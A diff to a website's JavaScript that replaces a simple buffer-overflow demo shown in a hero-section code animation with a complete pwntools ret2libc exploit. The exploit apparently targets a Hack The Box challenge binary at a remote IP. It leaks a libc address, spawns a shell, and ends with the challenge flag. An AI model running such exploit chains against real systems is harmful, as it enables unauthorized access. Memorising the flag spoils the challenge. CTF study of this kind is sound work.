@@ -96,31 +96,51 @@ document.addEventListener('DOMContentLoaded', function() {
     
     // Code animation in hero section
     const codeAnimation = document.getElementById('code-animation');
-    const pythonCode = `#!/usr/bin/env python3
-import sys
-from pwn import *
+    const pythonCode = `from pwn import *
 
-def exploit():
-    # Target binary and address
-    binary = "./vulnerable"
-    address = 0x080491e2
-    
-    # Create payload
-    payload = b"A" * 64           # Buffer padding
-    payload += p32(address)       # Return address
-    
-    # Establish connection
-    p = process(binary)
-    
-    # Send payload
-    p.sendline(payload)
-    
-    # Get shell
-    p.interactive()
-    
-if __name__ == "__main__":
-    exploit()
-    print("[+] Exploitation successful!")`;
+elf = context.binary = ELF('./restaurant')
+libc = elf.libc
+context.log_level = 'debug'
+
+# io = process(elf.path)
+io = remote('94.237.54.192', 56060)
+
+pop_rdi = 0x4010a3
+ret = 0x40063e
+
+io.recvuntil(b'> ')
+io.sendline(b'1')
+io.recvuntil(b'> ')
+
+payload = b'A' * 40
+payload += p64(pop_rdi)
+payload += p64(elf.got['puts'])
+payload += p64(elf.plt['puts'])
+payload += p64(elf.sym['main'])
+
+io.send(payload)
+io.recvuntil(b'A' * 40 + b'\xa3\x10@')
+
+leak = io.recvline().strip()
+leak = u64(leak.ljust(8, b'\x00'))
+# libc_base = leak - 0x80aa0 #libc.sym['puts']
+libc.address = leak - libc.sym['puts']
+log.info(f"Leaked puts address: {hex(libc.address)}")
+
+io.recvuntil(b'> ')
+io.sendline(b'1')
+io.recvuntil(b'> ')
+
+payload = b'A' * 40
+payload += p64(pop_rdi)
+payload += p64(next(libc.search(b'/bin/sh')))
+payload += p64(ret)
+payload += p64(libc.sym['system'])
+
+io.send(payload)
+io.interactive()
+
+#HTB{r3turn_2_th3_r3st4ur4nt!}`;
     
     let codeIndex = 0;
     
@@ -381,7 +401,7 @@ if __name__ == "__main__":
                 navMenu.classList.remove('active');
                 
                 window.scrollTo({
-                    top: targetElement.offsetTop - 80,
+                    top: targetElement.offsetTop,
                     behavior: 'smooth'
                 });
             }
